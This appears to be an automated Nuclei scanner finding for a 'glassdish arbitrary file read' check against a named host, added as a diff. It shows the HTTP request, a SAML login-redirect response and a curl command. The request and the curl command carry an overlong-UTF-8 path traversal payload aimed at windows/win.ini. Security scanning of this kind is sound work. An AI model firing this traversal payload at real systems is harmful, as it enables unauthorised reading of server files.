@@ -1,0 +1,79 @@
+### glassdish任意文件读取 (glassdish-arbitrary-file-read) found on https://99plus.dropboxer.net
+
+----
+**Details**: **glassdish-arbitrary-file-read** matched at https://99plus.dropboxer.net
+
+**Protocol**: HTTP
+
+**Full URL**: https://99plus.dropboxer.net/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini
+
+**Timestamp**: Sat Dec 9 14:02:44 +0000 UTC 2023
+
+**Template Information**
+
+| Key | Value |
+| --- | --- |
+| Name | glassdish任意文件读取 |
+| Authors | master先生 |
+| Tags | glassdish, file-read |
+| Severity | high |
+
+**Request**
+```http
+GET /theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini HTTP/1.1
+Host: 99plus.dropboxer.net
+User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36
+Connection: close
+Accept: */*
+Accept-Language: en
+Cookie: AWSALB=z42Qgpg0UbxDprew8aQ31sRZTdyMWCi8P+HVgoYqNpBfPhxTx0iBcFARBcsmQDekiBKaoKDPeNukkDr2Mj264b5VoNYAiQSoDtckCfGNNGTVaflGJGcpDY6HE8Bs; AWSALBCORS=z42Qgpg0UbxDprew8aQ31sRZTdyMWCi8P+HVgoYqNpBfPhxTx0iBcFARBcsmQDekiBKaoKDPeNukkDr2Mj264b5VoNYAiQSoDtckCfGNNGTVaflGJGcpDY6HE8Bs
+Accept-Encoding: gzip
+
+
+```
+
+**Response**
+```http
+HTTP/1.1 200 OK
+Connection: close
+Cache-Control: private, max-age=0, no-cache, no-store
+Content-Type: text/html; charset=UTF-8
+Date: Sat, 09 Dec 2023 14:02:44 GMT
+Server: Apache
+Set-Cookie: AWSALB=FXadVi5JQ8I5Yp77DJ7R3GUsovLZ7gStd3jx8GT+aiWQYDZIH4EC8g+r3mYyDnENE2nEcpiP6YTw7rwqo03tWAx6jcwQmjgz2ot9ytl6SmUf6X+MkviR0tiddv/O; Expires=Sat, 16 Dec 2023 14:02:44 GMT; Path=/
+Set-Cookie: AWSALBCORS=FXadVi5JQ8I5Yp77DJ7R3GUsovLZ7gStd3jx8GT+aiWQYDZIH4EC8g+r3mYyDnENE2nEcpiP6YTw7rwqo03tWAx6jcwQmjgz2ot9ytl6SmUf6X+MkviR0tiddv/O; Expires=Sat, 16 Dec 2023 14:02:44 GMT; Path=/; SameSite=None; Secure
+Strict-Transport-Security: max-age=31536000; includeSubDomains
+Vary: Accept-Encoding,User-Agent
+Via: 1.1 e193dc7153d24abe4297798fbf91a678.cloudfront.net (CloudFront)
+X-Amz-Cf-Id: I_bttg2PJOEfHv0EtH_X2O_Avad-SApZ-qNXi0di1m8NjvD1KZlZhA==
+X-Amz-Cf-Pop: MRS52-C2
+X-Cache: Miss from cloudfront
+X-Content-Type-Options: nosniff
+X-Dispatcher: dispatcher2uswest1
+X-Frame-Options: SAMEORIGIN
+X-Vhost: dropbox-intranet-prod.adobemsbasic.com
+
+<!DOCTYPE html PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN' 'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns='http://www.w3.org/1999/xhtml' xml:lang='en' lang='en'><head><meta http-equiv='content-type' content='text/html; charset=utf-8' /><title>POST data</title><script>    function setRequestPathCookies() {        var requestPath = window.location.pathname+window.location.search+window.location.hash;       document.cookie = "saml_request_path="+encodeURIComponent(requestPath)+";path=/;";   }</script></head><body onload='setRequestPathCookies(); document.forms[0].submit();'><noscript><p><strong>Note:</strong> Since your browser does not support JavaScript, you must press the button below once to proceed.</p></noscript><form method='post' action='https://dropbox.okta.com/app/dropboxokta_99plus_1/exk11w97tjBDkFkPa4x7/sso/saml'><input type='hidden' name='SAMLRequest' value='PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiIHN0YW5kYWxvbmU9Im5vIj8+PHNh
+bWxwOkF1dGhuUmVxdWVzdCB4bWxuczpzYW1scD0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4w
+OnByb3RvY29sIiBEZXN0aW5hdGlvbj0iaHR0cHM6Ly9kcm9wYm94Lm9rdGEuY29tL2FwcC9kcm9w
+Ym94b2t0YV85OXBsdXNfMS9leGsxMXc5N3RqQkRrRmtQYTR4Ny9zc28vc2FtbCIgSUQ9Il9iODgw
+NDBlYS02Y2IwLTRhZGQtYWI2NS02ZWVjODZmZmYyNjUiIElzc3VlSW5zdGFudD0iMjAyMy0xMi0w
+OVQxNDowMjo0NFoiIFByb3RvY29sQmluZGluZz0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4w
+OmJpbmRpbmdzOkhUVFAtUE9TVCIgVmVyc2lvbj0iMi4wIj48c2FtbDpJc3N1ZXIgeG1sbnM6c2Ft
+bD0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOmFzc2VydGlvbiI+aHR0cHM6Ly85OXBsdXMu
+ZHJvcGJveGVyLm5ldC88L3NhbWw6SXNzdWVyPjxzYW1scDpOYW1lSURQb2xpY3kgQWxsb3dDcmVh
+dGU9InRydWUiIEZvcm1hdD0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOm5hbWVpZC1mb3Jt
+YXQ6dHJhbnNpZW50Ii8+PC9zYW1scDpBdXRoblJlcXVlc3Q+' /><noscript><input type='submit' value='Submit' /></noscript></form></body></html>
+```
+
+References: 
+- https://www.freebuf.com/vuls/283806.html
+
+**CURL command**
+```sh
+curl -X 'GET' -H 'Accept: */*' -H 'Accept-Language: en' -H 'Cookie: AWSALB=z42Qgpg0UbxDprew8aQ31sRZTdyMWCi8P+HVgoYqNpBfPhxTx0iBcFARBcsmQDekiBKaoKDPeNukkDr2Mj264b5VoNYAiQSoDtckCfGNNGTVaflGJGcpDY6HE8Bs; AWSALBCORS=z42Qgpg0UbxDprew8aQ31sRZTdyMWCi8P+HVgoYqNpBfPhxTx0iBcFARBcsmQDekiBKaoKDPeNukkDr2Mj264b5VoNYAiQSoDtckCfGNNGTVaflGJGcpDY6HE8Bs' -H 'User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36' 'https://99plus.dropboxer.net/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini'
+```
+
+----
+
+Generated by [Nuclei v3.1.0-dev](https://github.com/projectdiscovery/nuclei)
